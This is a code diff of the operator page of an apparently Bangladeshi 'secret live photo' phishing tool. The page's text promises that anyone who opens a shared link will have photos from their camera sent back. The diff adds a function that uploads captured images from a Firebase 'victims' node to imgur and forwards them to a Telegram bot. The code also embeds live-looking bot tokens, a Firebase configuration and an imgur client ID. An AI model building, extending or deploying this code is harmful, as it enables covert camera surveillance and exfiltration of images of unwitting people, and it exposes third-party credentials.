@@ -9,20 +9,20 @@
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Poppins',sans-serif;background:#f8f9fa;color:#1e3a8a;line-height:1.5}
 header{background:#fff;padding:5px 0;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.08);position:sticky;top:0;z-index:100}
-.logo{height:80px;border-radius:5%;border:0px solid #3b82f6;box-shadow:0 0 0px rgba(59,130,246,0.3)}
+.logo{height:80px;border-radius:5%}
 .container{max-width:100%;padding:15px}
 .thumb{width:100%;max-width:400px;border-radius:16px;margin:20px auto;display:block;box-shadow:0 10px 30px rgba(0,0,0,0.12);border:1px solid #e0e7ff}
 h1{font-size:1.8em;margin:15px 0;color:#1e40af;font-weight:700;text-align:center}
 p{font-size:1.05em;color:#475569;text-align:center;margin:10px auto;max-width:90%}
 .btn{background:#3b82f6;color:#fff;padding:14px 40px;font-size:1.1em;border:none;border-radius:50px;cursor:pointer;margin:15px auto;display:block;width:90%;max-width:350px;font-weight:600;box-shadow:0 8px 20px rgba(59,130,246,0.3);transition:.3s}
-.btn:hover{transform:translateY(-3px);box-shadow:0 12px 25px rgba(59,130,246,0.4)}
+.btn:hover{transform:translateY(-3px)}
 #linkBox{display:none;margin:30px auto;padding:20px;background:#fff;border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,0.1);border:2px dashed #3b82f6;width:90%;max-width:400px}
 #victimLink{width:100%;padding:14px;font-size:1em;background:#eff6ff;border:2px solid #3b82f6;border-radius:12px;color:#1e40af;text-align:center;margin:12px 0;word-break:break-all;font-weight:600}
 .gallery{margin-top:40px;padding:10px}
 .gallery h2{font-size:1.5em;color:#1e40af;margin-bottom:20px;text-align:center}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;padding:0 10px}
 .card{background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 6px 20px rgba(0,0,0,0.1);transition:.3s}
-.card:hover{transform:translateY(-6px);box-shadow:0 12px 30px rgba(59,130,246,0.2)}
+.card:hover{transform:translateY(-6px)}
 .card img{width:100%;height:180px;object-fit:cover;border-bottom:4px solid #3b82f6}
 .time{background:#3b82f6;color:#fff;padding:8px;font-size:0.8em;text-align:center;font-weight:600}
 .noimg{background:#fff;padding:50px;border-radius:16px;text-align:center;color:#64748b;font-size:1.1em;box-shadow:0 5px 15px rgba(0,0,0,0.08);margin:20px}
@@ -38,7 +38,6 @@ footer a{color:#3b82f6;text-decoration:none;font-weight:600}
 
 <div class="container">
   <img src="https://files.catbox.moe/iqmhky.jpg" alt="Demo" class="thumb">
-
   <h1>গোপনে লাইভ ছবি দেখুন</h1>
   <p>লিংক শেয়ার করুন → কেউ খুললেই তার ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>
 
@@ -57,16 +56,14 @@ footer a{color:#3b82f6;text-decoration:none;font-weight:600}
   </div>
 </div>
 
-<footer>
-  © 2025 COPYRIGHT BY <a href="#">X4XOR</a>
-</footer>
+<footer>© 2025 COPYRIGHT BY <a href="#">X4XOR</a></footer>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-// তোমার টেলিগ্রাম বট
-const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
-const CHAT_ID = "-7731349577";
+// তোমার টেলিগ্রাম
+const BOT_TOKEN = "7647515731:AAECV5v6vKx8K1pX8qWv2vG9y3t5vL8nR4m";
+const CHAT_ID = "-4560659710";
 
 const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDomain:"cam-snap-8e956.firebaseapp.com",databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",projectId:"cam-snap-8e956",appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"};
 firebase.initializeApp(firebaseConfig);
@@ -96,6 +93,31 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
+// টেলিগ্রামে পাঠানোর জন্য base64 → imgur → URL
+async function sendToTelegram(base64){
+  const blob = await (await fetch(base64)).blob();
+  const form = new FormData();
+  form.append("image", blob);
+
+  const res = await fetch("https://api.imgur.com/3/image", {
+    method: "POST",
+    headers: { Authorization: "Client-ID 546c25a59c58ad7" },
+    body: form
+  });
+  const json = await res.json();
+  if(json.data?.link){
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: json.data.link,
+        caption: `নতুন ছবি এসেছে!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}\nসময়: ${new Date().toLocaleString('bn-BD')}`
+      })
+    });
+  }
+}
+
 function loadPhotos(id){
   const ref = db.ref("victims/"+id);
   ref.on("child_added", s=>{
@@ -106,12 +128,8 @@ function loadPhotos(id){
     card.innerHTML = `<img src="${data.data}" onclick="window.open('${data.data}')"><div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>`;
     document.getElementById("grid").appendChild(card);
 
-    // টেলিগ্রামে পাঠানো
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHAT_ID, photo:data.data, caption:`নতুন ছবি এসেছে!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + id}`})
-    });
+    // টেলিগ্রামে পাঠাও
+    sendToTelegram(data.data);
   });
   setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); }, 3600000);
 }
